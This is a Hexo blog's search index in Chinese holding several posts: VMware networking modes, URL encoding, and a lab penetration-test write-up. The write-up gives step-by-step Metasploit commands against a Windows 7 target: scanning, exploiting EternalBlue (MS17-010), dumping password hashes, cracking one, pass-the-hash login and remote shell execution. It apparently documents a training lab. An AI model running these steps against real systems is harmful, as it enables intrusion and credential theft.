<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VMware网络</title>
      <link href="/posts/69f69ca5/"/>
      <url>/posts/69f69ca5/</url>
      
        <content type="html"><![CDATA[<h2 id="VMware网络"><a href="#VMware网络" class="headerlink" title="VMware网络"></a>VMware网络</h2><h3 id="一、仅主机模式VMnet1"><a href="#一、仅主机模式VMnet1" class="headerlink" title="一、仅主机模式VMnet1"></a>一、仅主机模式VMnet1</h3><p>VMware虚拟化软件会在虚拟机内部虚拟一个交换机，每建一个虚拟机VM<sub>n</sub>都会连接到这个交换机上。这个交换机不能划分VLAN，所以连接到交换机上的虚拟机在一个广播域内，这个广播域内的虚拟机只要子网相同就可以相互通信。VMware虚拟机默认给我们分配了一个网段192.168.xxx.xxx，xxx是随机产生的，虚拟机给每一个网段分配一个DHCP服务器，DHCP服务会从网段中给虚拟机分配IP地址，默认是192.168.xxx.128-192.168.xxx.254。物理机可以通过物理网卡（有线或者无线）与外界通信，但是物理机并不能和虚拟网络通信。要想物理机和虚拟机通信，必须在虚拟网络编辑器的VMnet1中勾选“将主机虚拟适配器连接到此网络”选项。勾选后会在物理机产生一张VMnet1（192.168.xxx.1）虚拟网卡，并将虚拟网卡和虚拟网络中的交换机相连，此时物理机通过Vmnet1网卡和虚拟机连接在同一个局域网下，实现互相通信。我们可以新建很多个仅主机网络，虚拟机会产生多个switch，多个仅主机网络之间可以通讯，如果勾选“将主机虚拟适配器连接到此网络”则这些虚拟机会在物理机上产生多张VMnet网卡，物理机和各个虚拟机之间可以相互通信。</p><p><img src="/posts/69f69ca5/0.png"></p><h3 id="二、NAT模式VMnet8"><a href="#二、NAT模式VMnet8" class="headerlink" title="二、NAT模式VMnet8"></a>二、NAT模式VMnet8</h3><p>NAT网络和仅主机网络几乎一模一样，唯一不同的是NAT网络模式下虚拟机生成的VMnet8（192.168.xxx.1）虚拟网卡会提供一个虚拟的路由服务，虚拟的路由器（192.168.xxx.2）连接虚拟交换机和物理机的物理网卡，通过网络地址转换可以实现和外部通信。虚拟网卡VMnet的作用是实现物理机和虚拟机之间的通信，而不是连接internet。虚拟机连接internet是单向的，虚拟机可以和外网通信，但是外网是无法ping通虚拟机的，对于外部的物理机而言他们是在和物理机通信，如果虚拟机做了端口映射，外部物理机则可以ping通虚拟机。</p><h3 id="三、桥接模式VMnet0"><a href="#三、桥接模式VMnet0" class="headerlink" title="三、桥接模式VMnet0"></a>三、桥接模式VMnet0</h3><p>在仅主机模式的基础上，虚拟的交换机直接和物理机上的有线网卡或者无线网卡相连，此时虚拟机可以和物理机和外网通信，相当于在物理机所在局域网新增了一台虚拟的物理机，占用物理机所在网段的一个IP地址。桥接模式下自动选择桥接网卡则虚拟机会根据系统当前网卡自动配置，手动选择网卡模式下物理机有多少张网卡就可以新建多少个桥接网络。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 疑难杂症 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录一次渗透测试</title>
      <link href="/posts/2bb45121/"/>
      <url>/posts/2bb45121/</url>
      
        <content type="html"><![CDATA[<h2 id="渗透测试概述"><a href="#渗透测试概述" class="headerlink" title="渗透测试概述"></a>渗透测试概述</h2><p><img src="/posts/2bb45121/0.png"></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>靶机：Windows7SP1</p><p>攻击机：kali linux2021.4</p><h3 id="初始化数据库"><a href="#初始化数据库" class="headerlink" title="初始化数据库"></a>初始化数据库</h3><h4 id="设置数据库开机启动"><a href="#设置数据库开机启动" class="headerlink" title="设置数据库开机启动"></a>设置数据库开机启动</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sudo systemctl enable postgresql</code></pre><p><img src="/posts/2bb45121/1.png"></p><h4 id="开启数据库服务"><a href="#开启数据库服务" class="headerlink" title="开启数据库服务"></a>开启数据库服务</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sudo systemctl start postgresql</code></pre><h4 id="初始化数据库-1"><a href="#初始化数据库-1" class="headerlink" title="初始化数据库"></a>初始化数据库</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sudo msfdb init</code></pre><h4 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sudo msfdb status</code></pre><p><img src="/posts/2bb45121/2.png"></p><p><img src="/posts/2bb45121/3.png"></p><h4 id="进入msf控制台"><a href="#进入msf控制台" class="headerlink" title="进入msf控制台"></a>进入msf控制台</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sudo msfconsole</code></pre><p><img src="/posts/2bb45121/4.png"></p><h4 id="查看msf攻击模块"><a href="#查看msf攻击模块" class="headerlink" title="查看msf攻击模块"></a>查看msf攻击模块</h4><pre class="language-shell" data-language="shell"><code class="language-shell">cd /usr/share/metasploit-framework/modules</code></pre><p><img src="/posts/2bb45121/5.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap常用参数"><a href="#nmap常用参数" class="headerlink" title="nmap常用参数"></a>nmap常用参数</h3><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -sT 完整的TCP三次握手，精度较高，但是容易被发现nmap -sS 精度较低，但是隐蔽性高一些nmap -sP/-sn 进行存活性检查nmap -sV 对常见端口进行扫描nmap -p 对指定端口扫描</code></pre><h3 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h3><pre class="language-shell" data-language="shell"><code class="language-shell">db_namp -v 192.168.80.0/24</code></pre><p>扫描结果未必准确，如果对方开了防火墙我们也不能判断主机是否存活。</p><p>扫描数据被自动保存到刚才初始化的数据库中，在msf控制台我们可以输入命令<strong>hosts</strong>查看数据库中保存的存活主机。</p><p><img src="/posts/2bb45121/6.png"></p><p>可以看到每个主机的MAC地址也被扫描出来，其中主机192.168.80.129没有MAC地址，是我们本机IP地址。由于虚拟机采用的是NAT模式，一般xxx.xxx.xxx.1被分配给Windows物理机的vmnat8虚拟网卡。xxx.xxx.xxx.2是虚拟机网关路由地址。xxx.xxx.xxx.254是虚拟机的DHCP服务器地址。所以我们可以确定靶机的IP地址是192.168.80.132。我们也可以对IP逐个扫描来确定信息。</p><h3 id="扫描靶机详细信息"><a href="#扫描靶机详细信息" class="headerlink" title="扫描靶机详细信息"></a>扫描靶机详细信息</h3><pre class="language-shell" data-language="shell"><code class="language-shell">db_nmap -v -A 192.168.80.132</code></pre><p>在msf控制台我们可以用<strong>services</strong>命令查看靶机开放的端口协议等信息。再用<strong>hosts</strong>命令查看时发现靶机被识别出为Windows7客户机。</p><p><img src="/posts/2bb45121/7.png"></p><p><img src="/posts/2bb45121/8.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="利用模块工具"><a href="#利用模块工具" class="headerlink" title="利用模块工具"></a>利用模块工具</h3><p>利用工具对靶机进行端口扫描，寻找靶机开放的服务。对服务进行分析是否存在漏洞。如果存在漏洞对漏洞进行分析，再制定相应的攻击计划。对靶机进行渗透攻击。</p><h4 id="搜索相应模块"><a href="#搜索相应模块" class="headerlink" title="搜索相应模块"></a>搜索相应模块</h4><p>在msf中搜索需要用到的工具，例如搜索针对Windows平台FTP协议的辅助模块。</p><pre class="language-shell" data-language="shell"><code class="language-shell">search ftp type:aux platform:windows</code></pre><p><img src="/posts/2bb45121/9.png"></p><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><p>我们可以在搜索结果的基础上用<strong>use number</strong>命令来使用编号为number的模块，也可以直接使用<strong>use 模块路径</strong>（搜索结果中的Name值）使用相应模块。我们也可以使用**info [number]**命令查看模块信息。</p><p><img src="/posts/2bb45121/10.png"></p><h4 id="设置攻击载荷"><a href="#设置攻击载荷" class="headerlink" title="设置攻击载荷"></a>设置攻击载荷</h4><p>我们要对ftp端口进行扫描，先使用命令<strong>search portscan</strong>搜索端口扫描类的工具，我们使用编号为6的syn模块。</p><p><img src="/posts/2bb45121/11.png"></p><p>使用命令<strong>options</strong>查看模块需要设置的参数。</p><p><img src="/posts/2bb45121/12.png"></p><p>使用命令<strong>set</strong>查看已经设置的参数。</p><p><img src="/posts/2bb45121/13.png"></p><p>这里我们只需要将<strong>rhosts</strong>设置为要扫描对象的IP。我们也可以设置<strong>verbose</strong>为true来显示详细信息，设置扫描端口范围为1-500。</p><pre class="language-shell" data-language="shell"><code class="language-shell">set rhosts 192.168.80.132set verbose trueset posts 1-500</code></pre><p>再次使用<strong>set</strong>命令查看，发现rhosts已经设置为靶机IP。</p><p><img src="/posts/2bb45121/14.png"></p><h4 id="运行模块"><a href="#运行模块" class="headerlink" title="运行模块"></a>运行模块</h4><p>使用命令<strong>run</strong>来运行配置好的模块。</p><p>我们设置的端口范围很大，每一个端口都要进行TCP连接扫描进程太慢，这里已经扫描出了21端口我们停止扫描。使用命令jobs查看是否有服务还在工作状态。</p><p><img src="/posts/2bb45121/15.png"></p><h2 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h2><h3 id="利用脚本进行分析"><a href="#利用脚本进行分析" class="headerlink" title="利用脚本进行分析"></a>利用脚本进行分析</h3><h4 id="搜索脚本"><a href="#搜索脚本" class="headerlink" title="搜索脚本"></a>搜索脚本</h4><p>搜索/usr/share路径下和ftp相关的nse脚本。</p><pre class="language-shell" data-language="shell"><code class="language-shell">find /usr/share | grep "\.nse" | grep ftp</code></pre><p><img src="/posts/2bb45121/16.png"></p><p>搜索/usr/share路径下和smb相关的nse脚本。</p><pre class="language-shell" data-language="shell"><code class="language-shell">find /usr/share | grep "\.nse" | grep smb</code></pre><p><img src="/posts/2bb45121/18.png"></p><h4 id="用脚本扫描"><a href="#用脚本扫描" class="headerlink" title="用脚本扫描"></a>用脚本扫描</h4><p>用搜索出的第一个ftp脚本对靶机进行扫描，扫描出靶机FTP服务存在匿名账号登录。</p><pre class="language-shell" data-language="shell"><code class="language-shell">db_namp -v --script=ftp-anon.nse 192.168.80.132</code></pre><p><img src="/posts/2bb45121/17.png"></p><p>用搜索出的和永恒之蓝相关的脚本对靶机进行扫描，发现靶机存在永恒之蓝漏洞。</p><pre class="language-shell" data-language="shell"><code class="language-shell">db_nmap -v --script=smb-vuln-ms17-010.nse 192.168.80.132</code></pre><p><img src="/posts/2bb45121/19.png"></p><p>用<strong>vulns</strong>命令查看发现数据库中没有记录相应扫描结果。只有使用模块结果才会被记录。</p><p><img src="/posts/2bb45121/20.png"></p><h3 id="利用模块进行分析"><a href="#利用模块进行分析" class="headerlink" title="利用模块进行分析"></a>利用模块进行分析</h3><h4 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h4><p>搜索和smb相关的辅助模块。</p><pre class="language-shell" data-language="shell"><code class="language-shell">search smb type:aux</code></pre><p><img src="/posts/2bb45121/21.png"></p><h4 id="用模块扫描"><a href="#用模块扫描" class="headerlink" title="用模块扫描"></a>用模块扫描</h4><p>利用搜索出来编号为8的模块对靶机进行扫描。</p><pre class="language-shell" data-language="shell"><code class="language-shell">use 8 //使用编号为8的模块set rhosts 192.168.80.132 //设计攻击载荷rhostsrun //运行模块</code></pre><p>扫描出靶机可能存在永恒之蓝漏洞。</p><p><img src="/posts/2bb45121/22.png"></p><p>在msf控制台使用命令<strong>vulns</strong>查看数据库中记录了刚才的扫描结果。</p><p><img src="/posts/2bb45121/23.png"></p><h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="搜索模块-1"><a href="#搜索模块-1" class="headerlink" title="搜索模块"></a>搜索模块</h3><p>搜索和永恒之蓝相关的攻击模块。</p><pre class="language-shell" data-language="shell"><code class="language-shell">search ms17 type:exploit</code></pre><p><img src="/posts/2bb45121/24.png"></p><h3 id="使用模块进行攻击"><a href="#使用模块进行攻击" class="headerlink" title="使用模块进行攻击"></a>使用模块进行攻击</h3><p>使用搜索出来的编号为0的模块对靶机进行攻击。出现成功提示，攻击靶机成功。</p><pre class="language-shell" data-language="shell"><code class="language-shell">use 0set rhosts 192.168.80.132 //设计攻击载荷rhostsexploit //或者run来运行模块</code></pre><p><img src="/posts/2bb45121/25.png"></p><p>我们可以输入模块相关的指令对靶机进行渗透攻击，此时我们输入<strong>shell</strong>指令拿到靶机的shell，输入命令<strong>whoami</strong>查看当前用户。</p><p><img src="/posts/2bb45121/26.png"></p><h2 id="获取口令"><a href="#获取口令" class="headerlink" title="获取口令"></a>获取口令</h2><p>操作系统用户的口令HASH值存储在安全账户管理数据库（SAM）中，使用<strong>hashdump</strong>后渗透攻击模块读取SAM数据库，提取用户的口令HASH值。利用提取的用户的口令HASH值可以实现远程登录和特权执行。</p><h3 id="搜索模块-2"><a href="#搜索模块-2" class="headerlink" title="搜索模块"></a>搜索模块</h3><p>搜索Windows平台下类型为post和hashdump相关的模块。</p><pre class="language-shell" data-language="shell"><code class="language-shell">search hashdump type:post platform:windows</code></pre><p><img src="/posts/2bb45121/27.png"></p><h3 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h3><p>在meterpreter状态下不一定有特权，我们把当前的进程迁移到靶机有特权的进程上。Windows服务service有特权，我们找出靶机service所在进程，把当前利用的靶机非特权进程往特权进程里面迁移。</p><pre class="language-shell" data-language="shell"><code class="language-shell">pgrep services //搜索靶机services服务进程号migrate 492 //把当前进程迁移到492进程中</code></pre><p><img src="/posts/2bb45121/28.png"></p><p>可以看出当前利用的进程号为3016，迁移成功之后3016进程已经注入到492进程中，进程列表中3016进程消失。当前的进程号为492特权进程。</p><h3 id="使用模块-1"><a href="#使用模块-1" class="headerlink" title="使用模块"></a>使用模块</h3><p>使用搜索出的模块获取HASH值。</p><pre class="language-shell" data-language="shell"><code class="language-shell">run post/windows/gather/hashdump</code></pre><p><img src="/posts/2bb45121/29.png"></p><h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><p>复制HASH值使用[在线彩虹表](<a href="https://www.objectif-securite.ch/en/ophcrack">Objectif Sécurité - Ophcrack (objectif-securite.ch)</a>)破解出密码为：hwadee123。</p><p><img src="/posts/2bb45121/30.png"></p><p>尝试切换为管理员账号登录发现切换不了，说明管理员账号很有可能被禁用，我们用普通账户hwadee登录，登录成功。</p><p><img src="/posts/2bb45121/31.png"></p><p><img src="/posts/2bb45121/32.png"></p><p>我们可以使用<strong>background</strong>命令退回上一个状态，使用<strong>sessions</strong>命令查看会话，如果有多个会话的话可以使用<strong>sessions number</strong>命令切换会话。</p><p><img src="/posts/2bb45121/33.png"></p><h2 id="HASH口令直接登录"><a href="#HASH口令直接登录" class="headerlink" title="HASH口令直接登录"></a>HASH口令直接登录</h2><p>实际上根本不需要破解真实口令，通过传递口令HASH值一样可以实现登录或远程执行。</p><h3 id="搜索模块-3"><a href="#搜索模块-3" class="headerlink" title="搜索模块"></a>搜索模块</h3><p>搜索smb_login模块。</p><pre class="language-shell" data-language="shell"><code class="language-shell">search smb_login</code></pre><h3 id="设置攻击载荷-1"><a href="#设置攻击载荷-1" class="headerlink" title="设置攻击载荷"></a>设置攻击载荷</h3><pre class="language-shell" data-language="shell"><code class="language-shell">set rhosts 192.168.80.132set smbuser hwadeeset smbpass aad3b435b51404eeaad3b435b51404ee:710b51b5198edae38001b1553b2c0451run</code></pre><p><img src="/posts/2bb45121/34.png"></p><h2 id="远程shell控制"><a href="#远程shell控制" class="headerlink" title="远程shell控制"></a>远程shell控制</h2><pre class="language-shell" data-language="shell"><code class="language-shell">execute -i -f cmd.exe</code></pre><p><img src="/posts/2bb45121/35.png"></p><p>meterpreter是MSF扩展模块，作为渗透成功后的攻击载荷，它提供一个远程控制通道，实现远程系统shell连接。它能够对远程系统实施深入的渗透控制，如：获取shell、管理进程、屏幕截取、键盘记录、密码获取、权限提升、文件传输、跳板攻击等。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL编码</title>
      <link href="/posts/41385/"/>
      <url>/posts/41385/</url>
      
        <content type="html"><![CDATA[<h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><h3 id="为什么要编码转义"><a href="#为什么要编码转义" class="headerlink" title="为什么要编码转义"></a>为什么要编码转义</h3><p>通常如果一样东西需要编码，说明这种东西并不适合传输。原因多种多样，如size过大、包含隐私数据。对URL来说，之所以要进行编码，是因为URL中有些字符会引起歧义。例如URL字符串中使用形如<strong>key=value</strong>键值对的方式进行传参，键值对之间用**&amp;<strong>符号分隔，如</strong>?name=admin&amp;password=root<strong>。但是如果</strong>value<strong>字符串中包含了</strong>=<strong>或者</strong>&amp;<strong>符号，那么势必会造成接收URL的服务器解析错误，因此必须将引起歧义的</strong>=<strong>和</strong>&amp;<strong>符号进行转义，也就是对其进行编码。又如，URL的编码格式采用</strong>ASCII<strong>码，而不是</strong>Unicode<strong>码，也就是说在URL中不能包含任何</strong>非ASCII字符**，例如中文。否则如果在客户端浏览器和服务端浏览器支持的字符集不同的情况下，中文可能会造成问题。</p><h3 id="哪些字符需要编码"><a href="#哪些字符需要编码" class="headerlink" title="哪些字符需要编码"></a>哪些字符需要编码</h3><p><strong>RFC3986</strong>文档规定，URL中只允许包含<strong>英文字母（a-zA-Z）、数字（0-9）、（-_.~）四个特殊字符以及所有保留字符</strong>。RFC3986文档对URL的编解码给出了详细的建议，指出了哪些字符需要被编码才不会引起URL语义的转变，以及为什要对这些字符进行编码。</p><h4 id="不需要编码的字符"><a href="#不需要编码的字符" class="headerlink" title="不需要编码的字符"></a>不需要编码的字符</h4><p>RFC3986文档规定，URL中只允许包含以下四种字符：</p><blockquote><p>1、英文字母（a-zA-Z）</p><p>2、数字（0-9）</p><p>3、（-_.~）四个特殊字符</p><p>4、所有保留字符。</p><p>RFC3986中指定了以下字符为保留字符（英文字符）：! * ` () ; : @ &amp; = + $ , / ? # [ ]</p></blockquote><h4 id="需要编码的字符"><a href="#需要编码的字符" class="headerlink" title="需要编码的字符"></a>需要编码的字符</h4><p>在ASCII字符集中没有对应的可打印字符，URL只允许使用可打印字符。ASCII码中的10-7F字节全部表示控制字符，这些字符都不能直接出现在URL中。对于80-FF字节（ISO-8859-1），由于已经超出了ASCII定义的字节范围，因此也不能放在URL中。</p><p>保留字符，URL可以划分成若干个组件、协议、主机、路径等。有些字符（:/?#[]@）是用作分隔不同组件的。例如，冒号用于分隔协议和主机、/用于分隔主机和路径、?用于分隔路径和查询参数等。还有一些字符（!$&amp;`()*+,;=）用于在每个组件中起到分隔的作用，例如，=用于分隔查询参数中的键值对、&amp;用于分隔查询多个键值对等。<strong>当组件中的普通数据包含这些特殊字符时，需要对其进行编码</strong>。</p><h5 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h5><p>在URL中用到的特殊字符，需要将这些特殊字符转换成十六进制值。</p><h5 id="不安全字符"><a href="#不安全字符" class="headerlink" title="不安全字符"></a>不安全字符</h5><p>有一些字符当他们直接放在URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符。</p><blockquote><ol><li>空格：URL在传输的过程，或者用户在排版的过程，或者文本处理程序在处理URL的过程都有可能引入无关紧要的空格，或者将那些有意义的空格去掉。</li><li>引号以及&lt;&gt;：引号和尖括号通常用于在普通文本中起到分隔URL的作用。</li><li>#：通常用于表示书签或者锚点。</li><li>%：百分号本身用作对不安全字符进行编码时使用的特殊字符，故本身需要编码。</li><li>{}|^[]`~：某一些网关或者传输代理会篡改这些字符。</li></ol></blockquote><p>需要注意的是，对于URL中的合法字符，编码和不编码是等价的，但是对于上述字符，如果不经过编码，他们可能会造成URL语义的不同。因此只有英文字符、数字、特殊字符和保留字符才能出现在未经编码的URL中，其他字符均需要经过编码才能出现在URL中。但是由于历史原因，目前尚存一些不标准的编码，例如对于~符号，虽然RFC3986文档规定，对于波浪符号 ~不需要进行URL编码，但是仍然有很多老的网关或者传输代理会对其编码。</p><h3 id="如何进行编码"><a href="#如何进行编码" class="headerlink" title="如何进行编码"></a>如何进行编码</h3><p>URL编码原则：用安全的字符（没有特殊用途或者特殊意义的可打印字符）去表示那些不安全的字符。</p><p>URL编码通常也被称为百分号编码，因为它的编码方式是使用百分号 % 加上两位字符代表一个字节的十六进制。URL编码默认使用US-ASCII字符集。例如 a 在ASCII码中对应的字节是0x61，那么URL编码之后得到的就是 %61，我们在地址栏输入 <a href="https://www.baidu.com/baidu?wd=a%EF%BC%8C%E5%B0%B1%E7%AD%89%E5%90%8C%E4%BA%8E%E5%9C%A8%E7%99%BE%E5%BA%A6%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6">https://www.baidu.com/baidu?wd=%61，就等同于在百度搜索字符</a> a。又如@符号在ASCII字符集中对应的字节为0x40，经过URL编码之后对应的编码为%40。</p><p>对于非ASCII字符，需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。对于Unicode字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。例如“中文”用utf-8字符集编码得到的字节为 0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过URL编码之后得到编码 %E4%B8%AD%E6%96%87。</p><p>如果某个字节对应ASCII字符集中的非保留字符，这个字节无需使用百分号表示。例如“Url编码”，使用utf-8编码得到的字节是 0x55 0x72 0x6C 0xE7 0xBC 0x96 0xE7 0xA0 0x81,由于前三个字节对应着ASCII字符集中的非保留字符 Url，因此前三个字节可以用非保留字符 Url表示。最终的URL编码可以简化成 Url%E7%BC%96%E7%A0%81。当然，如果将前三个字符也进行编码也是可以的 %55%72%6C%E7%BC%96%E7%A0%81。</p><h3 id="具体编码处理方法"><a href="#具体编码处理方法" class="headerlink" title="具体编码处理方法"></a>具体编码处理方法</h3><h4 id="表单提交"><a href="#表单提交" class="headerlink" title="表单提交"></a>表单提交</h4><p>当HTML的表单被提交时，每个表单域都会被URL编码之后才被发送。由于历史的原因，表单使用的URL编码实现并不符合最新的标准。例如对于空格使用的编码并不是 %20，而是 +号，如果表单使用的是POST方法提交，我们可以在HTTP头中看到有一个Content-Type的header，值为application/x-www-form-urlencoded。大部分应用程序均能处理这种非标准实现的URL编码，但是在客户端JavaScript中，并没有一个函数能够将 +号解码成空格，只能自己写转换函数。还有，对于非ASCII字符，使用的编码字符集取决于当前文档使用的字符集。例如我们在HTML头部加上 charset=gb2312 ，这样浏览器就会使用gb2312去渲染此文档（注意，当HTML文档中没有设置此meta标签，则浏览器会根据当前用户喜好去自动选择字符集，用户也可以强制当前网站使用某个指定的字符集）。当提交表单时，URL编码使用的字符集就是gb2312。</p><h4 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h4><p>JavaScript中提供了3对函数用来对URL编码以得到合法的URL，它们分别是escape / unescape, encodeURI / decodeURI和encodeURIComponent / decodeURIComponent。这三个函数使用的的安全字符不同、兼容性不同、对Unicode字符的编码方式不同、适用场合不同。</p><h3 id="编码表"><a href="#编码表" class="headerlink" title="编码表"></a>编码表</h3><table><thead><tr><th>backspace %08</th><th>I %49</th><th>v %76</th><th>ó %D3</th></tr></thead><tbody><tr><td>tab %09</td><td>J %4A</td><td>w %77</td><td>&amp;Ocirc; %D4</td></tr><tr><td>linefeed %0A</td><td>K %4B</td><td>x %78</td><td>&amp;Otilde; %D5</td></tr><tr><td>creturn %0D</td><td>L %4C</td><td>y %79</td><td>&amp;Ouml; %D6</td></tr><tr><td>space %20</td><td>M %4D</td><td>z %7A</td><td>&amp;Oslash; %D8</td></tr><tr><td>! %21</td><td>N %4E</td><td>{ %7B</td><td>ù %D9</td></tr><tr><td>“ %22</td><td>O %4F</td><td>| %7C</td><td>ú　 %DA</td></tr><tr><td># %23</td><td>P %50</td><td>} %7D</td><td>&amp;Ucirc; %DB</td></tr><tr><td>$ %24</td><td>Q %51</td><td>~ %7E</td><td>ü %DC</td></tr><tr><td>% %25</td><td>R %52</td><td>￠ %A2</td><td>Y %DD</td></tr><tr><td>&amp; %26</td><td>S %53</td><td>￡ %A3</td><td>T %DE</td></tr><tr><td>‘ %27</td><td>T %54</td><td>￥ %A5</td><td>&amp;szlig; %DF</td></tr><tr><td>( %28</td><td>U %55</td><td>| %A6</td><td>à %E0</td></tr><tr><td>) %29</td><td>V %56</td><td>§ %A7</td><td>á %E1</td></tr><tr><td>* %2A</td><td>W %57</td><td>&amp;laquo; %AB</td><td>a %E2</td></tr><tr><td>+ %2B</td><td>X %58</td><td>&amp;not; %AC</td><td>&amp;atilde; %E3</td></tr><tr><td>, %2C</td><td>Y %59</td><td>ˉ %AD</td><td>&amp;auml; %E4</td></tr><tr><td>- %2D</td><td>Z %5A</td><td>o %B0</td><td>&amp;aring; %E5</td></tr><tr><td>. %2E</td><td>[ %5B</td><td>± %B1</td><td>&amp;aelig; %E6</td></tr><tr><td>/ %2F</td><td>\ %5C</td><td>a %B2</td><td>&amp;ccedil; %E7</td></tr><tr><td>0 %30</td><td>] %5D</td><td>, %B4</td><td>è %E8</td></tr><tr><td>1 %31</td><td>^ %5E</td><td>μ %B5</td><td>é %E9</td></tr><tr><td>2 %32</td><td>_ %5F</td><td>&amp;raquo; %BB</td><td>ê %EA</td></tr><tr><td>3 %33</td><td>` %60</td><td>&amp;frac14; %BC</td><td>&amp;euml; %EB</td></tr><tr><td>4 %34</td><td>a %61</td><td>&amp;frac12; %BD</td><td>ì %EC</td></tr><tr><td>5 %35</td><td>b %62</td><td>&amp;iquest; %BF</td><td>í %ED</td></tr><tr><td>6 %36</td><td>c %63</td><td>à %C0</td><td>&amp;icirc; %EE</td></tr><tr><td>7 %37</td><td>d %64</td><td>á %C1</td><td>&amp;iuml; %EF</td></tr><tr><td>8 %38</td><td>e %65</td><td>&amp;Acirc; %C2</td><td>e %F0</td></tr><tr><td>9 %39</td><td>f %66</td><td>&amp;Atilde; %C3</td><td>&amp;ntilde; %F1</td></tr><tr><td>: %3A</td><td>g %67</td><td>&amp;Auml; %C4</td><td>ò %F2</td></tr><tr><td>; %3B</td><td>h %68</td><td>&amp;Aring; %C5</td><td>ó %F3</td></tr><tr><td>&lt; %3C</td><td>i %69</td><td>&amp;AElig; %C6</td><td>&amp;ocirc; %F4</td></tr><tr><td>= %3D</td><td>j %6A</td><td>&amp;Ccedil; %C7</td><td>&amp;otilde; %F5</td></tr><tr><td>&gt; %3E</td><td>k %6B</td><td>è %C8</td><td>&amp;ouml; %F6</td></tr><tr><td>%3F</td><td>l %6C</td><td>é　 %C9</td><td>÷　 %F7</td></tr><tr><td>@ %40</td><td>m %6D</td><td>ê %CA</td><td>&amp;oslash; %F8</td></tr><tr><td>A %41</td><td>n %6E</td><td>&amp;Euml; %CB</td><td>ù %F9</td></tr><tr><td>B %42</td><td>o %6F</td><td>ì　 %CC</td><td>ú　 %FA</td></tr><tr><td>C %43</td><td>p %70</td><td>í %CD</td><td>&amp;ucirc; %FB</td></tr><tr><td>D %44</td><td>q %71</td><td>&amp;Icirc; %CE</td><td>ü %FC</td></tr><tr><td>E %45</td><td>r %72</td><td>&amp;Iuml; %CF</td><td>y %FD</td></tr><tr><td>F %46</td><td>s %73</td><td>D %D0</td><td>t %FE</td></tr><tr><td>G %47</td><td>t %74</td><td>&amp;Ntilde; %D1</td><td>&amp;yuml; %FF</td></tr><tr><td>H %48</td><td>u %75</td><td>ò %D2</td><td></td></tr></tbody></table><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> URL编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议</title>
      <link href="/posts/6443/"/>
      <url>/posts/6443/</url>
      
